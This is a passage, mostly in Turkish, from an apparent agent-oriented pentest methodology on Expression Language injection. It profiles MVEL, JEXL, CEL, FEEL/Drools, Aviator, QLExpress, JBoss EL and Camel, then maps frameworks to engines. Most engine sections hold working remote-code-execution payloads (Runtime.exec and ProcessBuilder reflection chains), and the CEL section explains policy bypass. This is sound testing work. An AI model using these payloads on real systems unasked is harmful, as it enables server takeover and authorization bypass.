  eval('2+2')                    (recursive/nested evaluation — bir
                                   string'i ikinci bir MVEL ifadesi
                                   olarak evaluate eder; bu, filtre
                                   ilk ifadeyi statik analiz ediyorsa
                                   payload'ı bir string literal
                                   içine gizlemenin bir yolu olabilir)
  with(obj) { property = value } (with statement — bir obje bağlamında
                                   çoklu property ataması, MVEL'e özgü)
  obj.?property                  (safe navigation/null-safe property
                                   access — `obj` null ise exception
                                   fırlatmadan `null` döner; bu
                                   normalde OGNL'de de benzer bir
                                   `?.`  vardır ama MVEL'de `.?`
                                   sözdizimi kullanılması ayırt edicidir)
  ```
- **Error signatures (Strong indicator):** `org.mvel2.CompileException`,
  `org.mvel2.PropertyAccessException`,
  `org.mvel2.optimizers.OptimizationFailure`.
- **RCE / confirmation (doğrudan `new` ile ProcessBuilder):**
  ```
  new java.lang.ProcessBuilder(new java.lang.String[]{"id"}).start()
  ```
- **RCE / confirmation (reflection zinciriyle, `new` kısıtlıysa
  alternatif):**
  ```
  ('java.lang.Runtime').getClass().forName('java.lang.Runtime')
    .getMethod('exec', java.lang.String.class)
    .invoke(('java.lang.Runtime').getClass().forName('java.lang.Runtime')
      .getMethod('getRuntime').invoke(null), 'id')
  ```
- **Çıktı okuma:**
  ```
  new java.util.Scanner(new java.lang.ProcessBuilder(
    new java.lang.String[]{"id"}).start().getInputStream())
    .useDelimiter("\\A").next()
  ```
- **Drools/DRL bağlamı — kural motoru üzerinden dolaylı MVEL/reflection
  erişimi:** Drools kural dosyaları (`.drl`) hem kendi DRL syntax'ını
  hem de `when`/`then` bloklarında gömülü Java-benzeri ifadeleri
  (MVEL dialect'i etkinleştirilmişse) destekler. Kullanıcı tanımlı
  bir "koşul" alanının doğrudan bir DRL kuralına derlendiği (dinamik
  kural oluşturma) senaryolarda, `then` bloğu tam bir Java/MVEL kod
  bloğu gibi davranabilir — bu, kural motoru tabanlı uygulamalarda
  en yüksek etkili EL Injection sink'lerinden biridir çünkü genelde
  **tam kod çalıştırma** (yalnızca ifade değil, ardışık statement'lar)
  sağlar.
- **`ParserContext`/strict type mode kısıtlaması:** Bazı MVEL
  entegrasyonları `ParserContext.setStrictTypeEnforcement(true)`
  kullanır — bu, dinamik `class.forName` zincirlerini kısıtlayabilir.
  Bu durumda önce hangi tiplerin/importların `ParserContext`'e
  kayıtlı olduğunu (context değişkenlerini enumerate ederek) keşfetmek
  gerekir (P4 — object-discovery).
- **Sandbox:** Default: yok. `ParserContext` yapılandırmasına bağlı
  olarak kısıtlanabilir (application-specific).

### 12.5 JEXL (Apache Commons JEXL) — Apache Camel, JMeter, Solr

> Ekosistem: Apache Commons JEXL kütüphanesi, Apache Camel (`jexl`
> language component'i), Apache JMeter (JEXL/JEXL3 fonksiyonları —
> `__jexl3` fonksiyonu), Apache Solr (bazı fonksiyon sorgularında),
> Apache Struts (bazı eklentilerde), çeşitli Apache proje entegrasyonları.

- **Technology fingerprint:** Camel route'larında `jexl:` prefix'i,
  JMeter test planlarında `${__jexl3(...)}` fonksiyon çağrıları,
  hata mesajlarında `org.apache.commons.jexl3`.
- **Delimiter:** Delimiter'sız çıplak ifade; JMeter bağlamında
  `${__jexl3(ifade,)}` sarmalayıcı sözdizimi kullanılır.
- **Generic detection:**
  ```
  6666*6666
  44444444-8888
  'AAA_' + '44435556'
  ${__jexl3(6666*6666,)}          (JMeter'e özgü sarmalayıcı)
  ```
- **Error signatures (Strong indicator):**
  `org.apache.commons.jexl3.JexlException`,
  `org.apache.commons.jexl3.JexlException$Parsing`,
  `org.apache.commons.jexl3.JexlException$Method`.
- **RCE / confirmation (`Class.forName` zinciri — potansiyel bir
  reflection yolu; çalışıp çalışmaması hedefin `JexlSandbox`
  yapılandırmasına, JEXL sürümüne ve context'e expose edilen sınıf
  kümesine bağlıdır, garanti bir sonuç değildir. JEXL'de doğrudan
  `new` bazı sürümlerde ayrıca kısıtlı olabilir):**
  ```
  Class.forName("java.lang.Runtime").getMethod("exec", Class.forName("java.lang.String"))
    .invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null), "id")
  ```
- **RCE / confirmation (JEXL3'te `new` doğrudan destekleniyorsa daha
  basit alternatif — **taşınabilirlik notu:** `["id"]` array-literal
  sözdizimi her JEXL sürümünde/yapılandırmasında aynı şekilde kabul
  edilmeyebilir; bu payload negatif dönerse önce yukarıdaki
  `Class.forName(...)` reflection zincirine geri dönülmeli, o daha
  taşınabilir/güvenilir formdur):**
  ```
  new("java.lang.ProcessBuilder", ["id"]).start()
  ```
- **JMeter bağlamına özgü örnek (bir test planı parametresi kullanıcı
  girdisinden türetiliyorsa):**
  ```
  ${__jexl3(new("java.lang.ProcessBuilder"\,["id"]).start()\,)}
  ```
  (JMeter fonksiyon sözdizimi virgülü ayraç olarak kullandığından,
  ifade içindeki virgüller `\,` ile escape edilmelidir — bu, motora
  özgü değil **taşıma katmanına özgü** bir encoding notudur, §8.1
  prensipleriyle aynı kategoridedir.)
- **`JexlSandbox` kısıtlaması:** JEXL3, opsiyonel bir `JexlSandbox`
  sınıfı sunar — bu yapılandırılmışsa yalnızca whitelist'teki
  sınıf/metotlara erişim izni verilir. Bir hedefte temel aritmetik
  çalışıyor ama `Class.forName`/`new` çalışmıyorsa, bu **JEXL'i
  elemez**, `JexlSandbox` aktif olduğunu gösterir — bu durumda P4
  (object-discovery) aşamasında context'e hangi sınıfların expose
  edildiği (application-specific objeler üzerinden) araştırılmalıdır.
- **Sandbox:** Opsiyonel (`JexlSandbox`) — SSTI skill'indeki Twig
  sandbox modeliyle kavramsal olarak benzer: bilinçli olarak
  eklenmesi gereken, varsayılan olarak kapalı bir mekanizma.

### 12.6 CEL (Common Expression Language) — Kubernetes, Envoy, Firebase, GCP

> Ekosistem: Kubernetes (`ValidatingAdmissionPolicy`,
> `MutatingAdmissionPolicy`, CRD validation kuralları — `x-kubernetes-
> validations`), Envoy Proxy (RBAC/route matching filtreleri), Istio
> (`AuthorizationPolicy` bazı gelişmiş koşullarda), Google Cloud IAM
> (conditional role binding'ler), Firebase Security Rules, Google
> Cloud Endpoints, OPA/Gatekeeper bazı entegrasyonlarda.

> **KRİTİK ÖN NOT:** CEL, diğer bu bölümdeki motorlardan **temelde
> farklı bir tasarım felsefesine** sahiptir — Google tarafından
> **bilinçli olarak Turing-complete OLMAYACAK** şekilde tasarlanmıştır:
> döngü/rekürsiyon yoktur (sonlandırma garantisi), sınıf/tip sistemine
> reflection erişimi yoktur, yan etkisi olan (side-effecting) hiçbir
> native fonksiyon yoktur. Bu yüzden CEL'de klasik "arithmetic →
> gadget zinciri → RCE" modeli **genelde uygulanmaz** — bu bir
> eksiklik/false-negative değil, **motorun tasarım hedefidir**
> (SSTI skill'indeki HTL/Liquid modeliyle kavramsal olarak aynı
> kategori, bkz. SSTI skill §12.2 HTL notu).
>
> **Reachability hatırlatması:** Bir teknolojide CEL kullanıldığının
> tespit edilmesi (ör. bir Kubernetes cluster'ında `ValidatingAdmissionPolicy`
> kullanıldığının görülmesi), tek başına "bu hedefte EL Injection test
> et" sonucuna otomatik olarak dönüşmemelidir — çoğu CEL ifadesi
> trusted config/policy olarak yazılır ve saldırgan girdisi bu
> ifadenin **kaynağını** hiç etkilemez (bkz. §2'deki "genelde kullanıcı
> girdisi doğrudan değil, config/manifest üzerinden dolaylı olarak
> ulaşır" notu). Asıl soru her zaman şudur: saldırgan-kontrollü bir
> girdi, bu CEL ifadesinin **kaynak string'ini** gerçekten
> değiştirebiliyor mu (ör. kullanıcı tanımlı bir policy/rule
> oluşturma endpoint'i var mı)? Değiştiremiyorsa, teknolojinin
> varlığı tek başına bir test adayı oluşturmaz.

- **Technology fingerprint:** Kubernetes manifest'lerinde
  `x-kubernetes-validations`/`ValidatingAdmissionPolicy` YAML
  anahtarları, Envoy config'inde `envoy.extensions.filters` altında
  CEL matcher referansları, Firebase `firestore.rules`/
  `database.rules.json` dosyalarında `allow read, write: if ...`
  blokları.
- **Delimiter:** Yok — CEL ifadeleri genelde bir YAML/JSON/protobuf
  alanının **tam değeri** olarak (delimiter'sız) yazılır (örn.
  `rule: "self.spec.replicas <= 10"`).
- **Generic detection:**
  ```
  6666*6666
  44444444-8888
  'AAA_' + '44435556'
  1 == 1
  ```
- **CEL'e özgü ek operatörler (RCE değil ama detection/fingerprinting
  ve policy-bypass keşfi için yararlı, diğer EL motorlarında bu tam
  sözdiziminde bulunmaz):**
  ```
  has(fieldName)               (field existence check — bir alanın
                                 tanımlı olup olmadığını test eder;
                                 CEL'e özgü sözdizimi, Strong indicator)
  size(list)                   (collection/string uzunluğu — generic
                                 detection için `size('AAAA')` gibi
                                 doğrulanabilir bir sonuç üretir)
  list.all(x, x > 0)           (quantifier expression — bir collection'ın
                                 tüm elemanlarının koşulu sağlayıp
                                 sağlamadığını test eder; policy bypass
                                 senaryolarında bir listenin manipüle
                                 edilebilir olup olmadığını keşfetmek
                                 için kullanılabilir)
  ```
- **Error signatures:** CEL implementasyonu dile göre değişir (Go
  implementasyonu Kubernetes/Envoy'da, Java implementasyonu bazı
  Google Cloud servislerinde) — hata mesajlarında `cel-go`,
  `google.api.expr`, `ExprValue`, `EvalError` gibi izler aranabilir.
- **Asıl risk yüzeyi — RCE değil, POLICY/AUTHORIZATION BYPASS:**
  CEL'in EL Injection'a açık olduğu senaryolarda hedef genelde kod
  çalıştırmak değil, **doğrulama mantığını atlatmaktır**:
  - **Her zaman true dönen bir ifade enjekte etme:** Eğer bir admission
    policy/security rule kullanıcı girdisinden dinamik olarak
    oluşturuluyorsa (application-specific bir yanlış konfigürasyon —
    normalde policy'ler developer/admin tarafından sabit yazılır),
    `true || (orijinal_kural)` gibi bir enjeksiyon tüm doğrulamayı
    etkisiz kılabilir.
  - **Tip coercion/karşılaştırma hatasından yararlanma:** CEL'in
    tip sistemi bazı örtük dönüşümlere izin verir; bu, belirli
    karşılaştırma ifadelerinin beklenmedik şekilde `true` dönmesine
    yol açabilir (application-specific, hedefin kullandığı spesifik
    kural mantığına bağlıdır — jenerik bir payload yoktur, P4
    object-discovery aşamasında hedefin kural şablonu incelenmelidir).
  - **Kaynak tüketimi (CEL'in "sonlandırma garantisi" istismarı
    DEĞİL, ama pratik DoS riski):** CEL sonsuz döngüye izin vermese
    de, çok büyük/derinlemesine iç içe koleksiyon işlemleri
    (`list.map(...)`, `list.filter(...)` zincirleri) hesaplama
    maliyetini büyük ölçüde artırabilir — bu, §0.2'deki "kasıtlı ağır
    DoS yok" kuralına tabidir, dikkatli ve sınırlı test edilmelidir
    (bkz. §9.2 bounded resource probe prensipleri).
- **Kayıtlı custom function abuse (nadir ama gerçek risk — OOB
  potansiyeli):** Bazı CEL entegrasyonları (özellikle uygulamaya özel
  extension'lar) kendi custom fonksiyonlarını CEL environment'ına
  kaydeder (`env.Functions(...)`). Bu fonksiyonlardan biri network
  I/O yapıyorsa (örn. bir "harici doğrulama servisi" çağıran bir
  fonksiyon), bu fonksiyonun **parametrelerini** kontrol ederek OOB
  tetiklenebilir — bkz. §9.3'teki CEL OOB örneği. Bu, CEL'in kendi
  RCE'si değil, **uygulamanın CEL environment'ına eklediği ek
  yüzeydir**.
- **Sandbox:** Yok konsepti burada geçerli değildir — CEL'in
  **tamamı** tasarım gereği "sandboxed"tır, opsiyonel bir eklenti
  değildir. Bu, dosyadaki diğer tüm motorlardan (Java EL, OGNL, SpEL,
  MVEL, JEXL — hepsi varsayılan olarak sandbox'sızdır) temel bir
  farktır ve raporlama yaparken mutlaka belirtilmelidir: "CEL
  Injection confirmed ama RCE mümkün değil (motorun tasarımı gereği),
  asıl etki policy/authorization bypass'tır" — bu **geçerli ve tam**
  bir sonuçtur, RCE aranmaya devam edilmemelidir (bkz. §7 Negative
  Capability Matrix ilkesi).

### 12.7 FEEL (Friendly Enough Expression Language) ve DRL (Drools Rule Language)

> Ekosistem: Camunda (BPMN/DMN motoru — FEEL, DMN karar tablolarında
> ve BPMN gateway koşullarında birincil ifade dilidir), Flowable,
> jBPM/Drools (DRL — tam bir kural tanımlama dilidir, yalnızca bir
> ifade dili değil).

#### FEEL (Camunda DMN/BPMN)

- **Technology fingerprint:** `.dmn`/`.bpmn` dosya referansları,
  Camunda REST API endpoint'leri (`/engine-rest/`), DMN karar tablosu
  editör arayüzleri.
- **Delimiter:** Yok — FEEL ifadeleri genelde bir DMN hücresinin veya
  BPMN gateway koşulunun **tam değeri** olarak yazılır. Sözdizimi
  diğer motorlardan belirgin şekilde farklıdır (İngilizce'ye yakın,
  `if...then...else`, `for...in...return` gibi doğal dile yakın
  yapılar).
- **Generic detection:**
  ```
  6666*6666
  44444444-8888
  "AAA_" + string(44435556)
  ```
  **FEEL'e özgü sözdizimi — arithmetic'ten daha güçlü fingerprint:**
  Yukarıdaki arithmetic probe'lar FEEL'de çalışsa da, bu sözdizimi
  çoğu başka EL motorunda da geçerlidir (zayıf fingerprint değeri).
  FEEL'in kendine özgü, doğal-dile-yakın sözdizimini test etmek çok
  daha ayırt edicidir:
  ```
  if 6666=6666 then "AAA_MATCH" else "AAA_NOMATCH"
  for x in [1,2,3] return x*2
  some x in [1,2,3] satisfies x > 2
  every x in [1,2,3] satisfies x > 0
  ```
  Bunlardan biri (ör. `if...then...else` yapısının doğru sonucu
  üretmesi) çalışırsa, bu **FEEL'e özgü, başka motorlarla karışma
  ihtimali çok düşük** bir Strong indicator'dır — çünkü bu doğal-dile-
  yakın yapı OGNL/SpEL/MVEL/JEXL'in hiçbirinde bu sözdizimiyle
  bulunmaz.
- **RCE kapasitesi:** FEEL, CEL'e benzer şekilde **kasıtlı olarak
  kısıtlı** bir ifade dilidir — doğrudan Java reflection/sınıf erişimi
  **yoktur**. Ama Camunda'nın motoru (bazı entegrasyon noktalarında)
  FEEL ifadesi yerine yanlışlıkla/yapılandırma hatasıyla bir
  Groovy/JUEL script'i evaluate ediyorsa (Camunda birden fazla script
  dilini destekler ve hangisinin kullanıldığı task/gateway
  tanımındaki `scriptFormat` alanına bağlıdır), o durumda tamamen
  farklı bir motor profiline (Groovy — bkz. SSTI skill §12.2, veya
  Java EL/UEL — bkz. §12.1) geçilmiş olur. **Bu yüzden ilk adım her
  zaman hangi script/expression dilinin gerçekten kullanıldığını
  doğrulamaktır** — "Camunda kullanıyor" tek başına "FEEL kullanıyor,
  o yüzden RCE yok" sonucuna varmak için yeterli değildir.
- **Asıl risk:** CEL ile aynı kategori — iş akışı/karar mantığının
  manipülasyonu (örn. bir onay gate'inin koşulunun atlatılması),
  RCE değil.

#### DRL (Drools Rule Language)

- **Technology fingerprint:** `.drl` dosya referansları, `KieSession`/
  `KieBase`/`KieContainer` hata mesajları, `org.kie.api`/
  `org.drools` paket adları.
- **Delimiter:** DRL, bir ifade dilinden çok tam bir **kural
  tanımlama dilidir** (`rule "..." when ... then ... end` yapısı).
  `when`/`then` blokları içinde Java (varsayılan dialect) veya MVEL
  dialect'i kullanılabilir — hangisinin aktif olduğu `dialect "mvel"`
  bildirimi/paket ayarına bağlıdır.
- **Generic detection:** Eğer kullanıcı girdisi doğrudan bir DRL kural
  gövdesine (özellikle `then` bloğuna) enjekte edilebiliyorsa, **iki
  farklı sözdizimi ailesi ayrı ayrı denenmelidir — hangisinin aktif
  olduğu önceden varsayılamaz:**
  ```text
  1. Java dialect payload'ları (§12.1 Java EL'deki reflection zincirine
     benzer, ama düz Java statement sözdizimiyle — DRL'in varsayılanı
     budur, resmi Drools dokümantasyonuna göre "The default value is
     Java")
  2. §12.4 MVEL profilindeki payload'lar (yalnızca `dialect "mvel"`
     paket/kural seviyesinde açıkça bildirilmişse aktiftir)
  ```
  Java dialect payload'ı negatif dönerse MVEL denenmeli, ve tam
  tersi — hangisinin negatif/pozitif döndüğü, aynı zamanda hangi
  dialect'in aktif olduğuna dair bir fingerprint kanıtıdır. Bu,
  DRL'i ayrı bir motor olarak değil, **iki olası dialect'in bir
  kapsayıcısı** olarak ele almayı gerektirir — "MVEL varsayılandır"
  varsayımı yanlış olduğu için, yalnızca MVEL payload'ı deneyip
  negatif sonuç alan bir agent, aslında Java dialect'inde çalışan
  gerçek bir zafiyeti false-negative olarak kaçırabilir.
- **RCE / confirmation:** Java dialect aktifse §12.1 Java EL'deki
  reflection zincirini (düz Java statement olarak, `${}` delimiter'ı
  olmadan) dene; MVEL dialect aktifse §12.4 MVEL — her iki durumda da
  DRL'in kendi `insert`/`update`/`retract` fact-manipülasyon komutları,
  RCE olmasa bile iş mantığını (hangi kuralların tetiklendiğini)
  manipüle etmek için kullanılabilir — bu ayrı bir impact boyutudur.
- **Sandbox:** Default: yok (MVEL'in sandbox durumuyla birebir aynı).

### 12.8 Aviator ve QLExpress — Alibaba Ekosistemi

> Ekosistem: Çoğunlukla Çin merkezli büyük ölçekli Java sistemlerinde
> (Alibaba ve geniş ekosistem projeleri — Nacos, Dubbo, RocketMQ,
> Seata gibi altyapı bileşenlerinin bazı dahili karar/kural
> mekanizmalarında, ayrıca birçok kurumsal iç sistemde kural motoru
> olarak) karşılaşılan iki hafif EL motoru. Global olarak daha az
> yaygın olsalar da, bu ekosistemdeki hedeflerde sıkça karşılaşılır
> ve iyi dokümante edilmiş RCE geçmişleri vardır.

#### Aviator (`googlecode.aviator` / `com.googlecode.aviator`)

- **Technology fingerprint:** Hata mesajlarında
  `com.googlecode.aviator.exception`, `AviatorEvaluator` sınıf adı.
- **Delimiter:** Yok — çıplak ifade.
- **Generic detection:**
  ```
  6666*6666
  44444444-8888
  'AAA_' + '44435556'
  ```
- **Error signatures (Strong indicator):**
  `com.googlecode.aviator.exception.ExpressionRuntimeException`,
  `com.googlecode.aviator.exception.CompileExpressionErrorException`.
- **RCE / confirmation — sürüme göre değişen kapasite (KRİTİK
  version-dependent not):** Eski Aviator sürümlerinde `seq.map`/
  `seq.reduce` gibi fonksiyonel programlama fonksiyonları ile birlikte
  Java statik metotlarına reflection üzerinden erişim mümkündü:
  ```
  seq.map(seq.list(1),function(x) {
    return  java.lang.Runtime.getRuntime().exec('id');
  })
  ```
  **Sürüm notu:** Lambda/fonksiyon tanımlama anahtar kelimesi
  Aviator sürümüne göre değişebilir (`function` veya `fn`) — bu
  sandbox ortamında kesin sürüm-bazlı doğrulama yapılamadığı için,
  yukarıdaki negatif dönerse `fn` varyantı da ayrıca denenmelidir:
  ```
  seq.map(seq.list(1),fn(x) {
    return java.lang.Runtime.getRuntime().exec('id');
  })
  ```
  Daha yeni sürümlerde `AviatorEvaluatorInstance` üzerinde
  `setOption(Options.ALLOWED_CLASS_SET, ...)` gibi bir whitelist
  mekanizması eklenmiştir — bu aktifse yukarıdaki payload
  **çalışmaz**, bu Aviator'ü **elemez**, yalnızca whitelist'in aktif
  olduğunu gösterir (bkz. §7 Negative Capability Matrix ilkesi).
  Spesifik sürüm eşiği kasıtlı olarak burada belirtilmemiştir (bkz.
  §15), hedefte ampirik doğrulama önerilir.
- **Sandbox:** Sürüme göre değişir — modern sürümlerde opsiyonel
  class whitelist mekanizması mevcuttur.

#### QLExpress (`com.ql.util.express`)

- **Technology fingerprint:** Hata mesajlarında
  `com.ql.util.express.ExpressRunner`,
  `com.ql.util.express.QLException`.
- **Delimiter:** Yok — Java'ya oldukça yakın bir çıplak ifade/script
  sözdizimi (birden fazla statement, `if/else`, döngü desteği).
- **Generic detection:**
  ```
  6666*6666;
  44444444-8888;
  "AAA_" + "44435556";
  ```
- **Error signatures (Strong indicator):**
  `com.ql.util.express.QLException`,
  `com.ql.util.express.ExpressRunner`.
- **RCE / confirmation — `ExpressRunner`'ın varsayılan
  konfigürasyonuna bağlı (KRİTİK):** QLExpress'in `ExpressRunner`
  sınıfı, oluşturulurken bir "sadece güvenli metotlara izin ver"
  (`isPrecise`/güvenlik bayrağı) modunda çalıştırılabilir. Bu bayrak
  **kapalıysa** (bazı entegrasyonların varsayılan/yanlış
  konfigürasyonu), doğrudan Java sınıf erişimi ve reflection mümkündür:
  ```
  import java.lang.Runtime;
  Runtime.getRuntime().exec("id");
  ```
  Bayrak **açıksa**, yalnızca önceden kayıtlı (whitelist'teki)
  fonksiyonlara erişim mümkündür — bu QLExpress'i elemez, yalnızca
  güvenli modun aktif olduğunu gösterir.
- **Sandbox:** `ExpressRunner` constructor parametresine bağlı
  (application-specific) — bu motorda "sandbox" bir eklenti değil,
  bir constructor/başlatma seçimidir (SpEL'deki
  `StandardEvaluationContext` vs `SimpleEvaluationContext` ayrımıyla
  kavramsal olarak benzer).

### 12.9 JUEL / JBoss EL — WildFly/JBoss Standalone Implementasyonu

> JBoss/WildFly, Java EL (JSR 245/341) spesifikasyonunun kendi
> implementasyonunu (tarihsel olarak "JBoss EL", modern sürümlerde
> Jakarta EL referans implementasyonu) kullanır. Sözdizimi ve davranış
> §12.1'deki (Java EL/UEL) genel profille **büyük ölçüde aynıdır** —
> ayrı bir bölüm olarak tutulmasının nedeni, bazı sürümlerde
> gözlemlenen implementasyon-özgü hata mesajları ve context
> davranışlarıdır.

- **Technology fingerprint:** Hata mesajlarında `org.jboss.el`
  (eski JBoss EL implementasyonu, WildFly'ın erken sürümleri) veya
  standart `jakarta.el`/`javax.el` (modern WildFly, Jakarta EE
  referans implementasyonunu kullanır) paket izleri.
- **Payload'lar:** §12.1 Java EL/UEL profilindeki tüm detection,
  fingerprint ve RCE payload'ları doğrudan geçerlidir — ayrıca bu
  bölüm tekrarlanmamıştır.
- **Ayırt edici not:** JBoss/WildFly yönetim konsolu (`/console`) ve
  bazı özel MBean/JMX entegrasyonları, EL ifadelerini yönetimsel
  komutlarla (deployment, resource tanımlama) birleştirebilir — bu
  durumda EL Injection'ın impact'i yalnızca RCE değil, doğrudan
  **sunucu yönetimi/deployment manipülasyonu** seviyesine çıkabilir;
  impact assessment'ta bu ayrıca değerlendirilmelidir (bkz. §10.4).

### 12.10 Apache Camel — Çoklu-Motor "Pluggable Language" Katmanı (Cross-Cutting Not)

Apache Camel, kendi route tanımlama DSL'i içinde **birden fazla EL
motorunu eklenti (pluggable language) olarak** destekler: `simple`
(Camel'e özgü, EL'in kendisi kadar güçlü olmayan basit bir dil, ama
kendi sözdizimi üzerinden bazı sürümlerde enjeksiyon sorunları
yaşamıştır — bkz. Camel'in kendi güvenlik advisory geçmişi, spesifik
CVE burada verilmemiştir, hızla eskir), `ognl`, `mvel`, `jexl`,
`groovy`, `spel`, `xpath`, `jsonpath` (bu ikisi — `xpath`/`jsonpath` —
kendi başlarına ayrı sorgu dilleridir, bu skill'in EL motor
profillerine dahil değildir, ama aynı `language()` dispatch
mekanizmasından geçtikleri için burada anılır). Bir Camel tabanlı
entegrasyon platformunda (özellikle kullanıcıların kendi route'larını
tanımlayabildiği bir "entegrasyon builder" ürününde) hangi dilin
kullanıldığı **route tanımının kendisinde** (`.setBody(ognl("..."))`
gibi) belirtilir.

**Pratik metodoloji notu:** Bir Camel hedefinde EL Injection ararken,
önce route tanımının hangi `language()` çağrısını kullandığını
(kaynak koda erişim varsa) veya hangi motora özgü hata mesajının
döndüğünü (black-box'ta) tespit et — sonra ilgili motorun (§12.2
OGNL, §12.4 MVEL, §12.5 JEXL, §12.3 SpEL) profiline geç. Camel'in
kendisi ayrı bir motor değildir, bu skill'deki motorlar için bir
**dispatch/taşıma katmanıdır** (GraphQL'in §11'de tanımlanan rolüyle
kavramsal olarak aynı).

---

## 13. CMS / Framework / Platform → EL Motoru Eşleme Tablosu

**Önemli düzeltme:** Aşağıdaki eşlemeler **varsayılan/tipik kurulum**
bilgisidir, kesin kural değildir. "Davranış Bağımlılığı" sütunu bu
eşlemenin default mu, configuration/version'a mı, yoksa uygulamaya
özel bir özelleştirmeye mi bağlı olduğunu belirtir.

**Genel karar akışı (tüm tablo için geçerli, yalnızca Camel'e özgü
değil):** Bu tablo, `engine_hypothesis` alanını doğrudan doldurmak
için değil, bir **başlangıç noktası** oluşturmak için kullanılır.
Framework tespiti tek başına motoru belirlemez:
```text
1. Framework/platform tespit edildi (ör. Spring, Camunda, Camel)
2. "Davranış Bağımlılığı" sütununa bakılır:
   - "Default behavior" → motor hipotezi doğrudan kurulabilir
   - "Application-specific"/"Version-dependent" → 3. adıma geçilir
3. İlgili component/feature/config tespit edilir (ör. Camel'de
   hangi language() çağrısı; Camunda'da scriptFormat alanı; Spring'de
   @Value içinde ${} mi #{} mi)
4. Yalnızca bu noktadan sonra engine_hypothesis kurulur ve ilgili
   motor profiline (§12.x) geçilir
```
Yani "framework bulundu → motor seçildi" kısayolu yerine, "framework
bulundu → hangi component/config aktif → O ZAMAN motor seçildi"
sırası izlenir. Bu, özellikle "Application-specific"/"Version-dependent"
olarak işaretlenmiş satırlarda (Spring, Camunda, Camel, Drools gibi)
kritiktir.

| Framework/Platform | EL Motoru | Davranış Bağımlılığı |
|---|---|---|
| Apache Struts2 / WebWork | OGNL | Default behavior: parametre binding mekanizmasının çekirdeği — bkz. §12.2 |
| Spring Framework / Spring Boot | SpEL (capability mevcut) | Application-specific: Spring kullanılıyor olması TEK BAŞINA "SpEL test et" anlamına gelmez — `@Value`/Spring Security/Spring Data içinde SpEL'in gerçekten saldırgan girdisine ulaştığı (reachability) ayrıca doğrulanmalı, bkz. §12.3 `${}` vs `#{}` ayrımı |
| Spring Security | SpEL | Default behavior: `@PreAuthorize`/`@PostAuthorize` — bkz. §12.3 authorization bypass notu |
| Spring Cloud Function / Gateway | SpEL | Version-dependent: `routing-expression` bazı sürümlerde header üzerinden tetiklenebilir — bkz. §11 |
| JSF (Mojarra/MyFaces) | Java EL / UEL | Default behavior — bkz. §12.1 |
| PrimeFaces | Java EL / UEL | Version-dependent: ViewState şifreleme zaafı ile birlikte kritik hale gelebilir — bkz. §12.1 |
| RichFaces / ICEfaces | Java EL / UEL | Default behavior — bkz. §12.1 |
| JBoss / WildFly | Java EL / UEL (JBoss EL implementasyonu) | Version-dependent: bkz. §12.9 |
| GlassFish / Payara | Java EL / UEL | Default behavior — bkz. §12.1 |
| WebLogic / Oracle Fusion Middleware | Java EL / UEL | Application-specific: JSF tabanlı portal bileşenlerinde — bkz. §12.1 |
| WebSphere / IBM Liberty | Java EL / UEL | Default behavior — bkz. §12.1 |
| Drools (kural motoru) | Java (varsayılan dialect) + MVEL (opsiyonel, `dialect "mvel"` ile) + DRL syntax'ı | Application-specific: hangi dialect'in aktif olduğu paket/kural bildirimine bağlı, MVEL varsayılan DEĞİLDİR — bkz. §12.4, §12.7 |
| JBPM / Activiti / Flowable | MVEL (script task'lerde) + FEEL (DMN'de) | Application-specific: hangi script formatının seçildiğine bağlı — bkz. §12.4, §12.7 |
| Camunda (BPMN/DMN) | FEEL (birincil), Groovy/JUEL (script task seçeneği) | Application-specific: `scriptFormat` alanına bağlı — bkz. §12.7 |
| OptaPlanner | MVEL (kısıtlama/skorlama ifadelerinde) | Default behavior — bkz. §12.4 |
| Apache Camel | Route'a göre değişir: OGNL/MVEL/JEXL/SpEL/Groovy (pluggable) | Application-specific: route tanımındaki `language()` seçimine bağlı — bkz. §12.10 |
| Apache JMeter | JEXL3 (`__jexl3` fonksiyonu) | Default behavior — bkz. §12.5 |
| Apache Solr | JEXL (bazı fonksiyon sorgularında), Velocity (SSTI — kapsam dışı) | Version-dependent — bkz. §12.5; Velocity kısmı için SSTI skill'ine bakınız |
| Kubernetes (Admission Policy/CRD validation) | CEL | Default behavior: `x-kubernetes-validations` — bkz. §12.6 |
| Envoy Proxy / Istio | CEL | Default behavior: RBAC/route matcher filtreleri — bkz. §12.6 |
| Google Cloud IAM (conditional bindings) | CEL | Default behavior — bkz. §12.6 |
| Firebase Security Rules | CEL (benzeri, Firebase'in kendi CEL-türevi dili) | Default behavior — bkz. §12.6 |
| OPA / Gatekeeper | Rego (bu skill'in kapsamı DIŞINDA — CEL değildir, ayrı bir policy dilidir; bazı entegrasyonlar CEL ile karma kullanılabilir) | Application-specific |
| Atlassian Confluence (bazı bileşenler) | OGNL | Version-dependent — bkz. §12.2 |
| Alibaba Nacos / Dubbo / Seata (dahili mekanizmalar) | Aviator / QLExpress (bazı dahili kural/koşul mekanizmalarında) | Application-specific: her ürünün hangi motoru hangi bileşende kullandığı değişir — bkz. §12.8 |
| Alibaba/Çin ekosistemi kurumsal iç sistemler | Aviator / QLExpress | Application-specific — bkz. §12.8 |
| Apache OFBiz | Groovy (ağırlıklı, EL değil — SSTI skill'ine bakınız), bazı bileşenlerde JUEL | Application-specific |
| Liferay Portal | Java EL / UEL (JSP tabanlı portlet'lerde) | Default behavior — bkz. §12.1 |
| ColdFusion (Adobe) | CFML kendi ifade dili (bu skill'in kapsamı DIŞINDA — ayrı bir dildir, EL ailesine dahil değildir) | N/A |
| Thymeleaf (Spring Boot ile) | SpEL (`SpringStandardDialect` üzerinden) — **SSTI ile karışma riski yüksek** | Application-specific: bkz. §3.2 ayrım kuralı, ve SSTI skill §12.2 Thymeleaf profili |
| n8n benzeri no-code workflow builder'lar | Node.js expression sandbox (bu skill'in kapsamı DIŞINDA — JavaScript tabanlıdır, Java EL ailesine dahil değildir; bkz. SSTI skill §11/§12.3) | Application-specific |
| Node-RED | Node.js expression sandbox (bu skill'in kapsamı DIŞINDA — n8n ile aynı kategori, JavaScript tabanlıdır; bkz. SSTI skill) | Application-specific |
| ZK Framework | Java EL (`${}`) + ZK'nın kendi component-binding sözdizimi (`@{}` — bu ZK'ya özgüdür, **core Java EL delimiter'ı değildir**, Thymeleaf'in kendi `@{}` URL-expression sözdiziminden de ayrı bir mekanizmadır) | Default behavior: `.zul` dosyalarında EL ifadeleri, component/parametre binding mekanizması — bkz. §12.1 |
| Apache Tapestry | Kendi property-access dili (OGNL-benzeri, ama ayrı implementasyon) | Application-specific: `PropertyModel`/`Binding` mekanizmaları üzerinden |
